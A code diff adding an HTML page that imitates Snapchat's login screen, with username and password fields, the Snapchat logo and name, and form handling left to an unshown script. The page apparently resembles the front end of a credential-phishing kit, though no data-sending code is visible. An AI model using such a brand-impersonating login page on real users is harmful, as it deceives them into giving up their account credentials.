@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <link rel="stylesheet" href="Snapchat.css">
+</head>
+<body>
+    <div class="container login-container">
+        <div class="language-container">
+            <button class="language-btn" onclick="toggleLanguageMenu()">🌐</button>
+            <div class="language-menu" id="language-menu">
+                <a href="#" onclick="setLanguage('en')">English</a>
+                <a href="#" onclick="setLanguage('fr')">Français</a>
+            </div>
+        </div>
+        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
+        <h1 id="title">Log In</h1>
+        <form id="loginForm">
+            <input type="text" name="username" class="login-input" placeholder="Username or Email" id="username-placeholder" required>
+            <div class="password-container">
+                <input type="password" name="password" class="login-input" placeholder="Password" id="password-placeholder" required>
+                <span class="toggle-password" onclick="togglePasswordVisibility()">
+                    <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999999" stroke-width="2">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                </span>
+            </div>
+            <button type="submit" class="login-btn" id="login-btn">Log In</button>
+        </form>
+        <a href="#" class="forgot-link" id="forgot-link">Forgot Password?</a>
+        <p class="support-text" id="support-text">New to Snapchat? <a href="#">Sign Up</a></p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
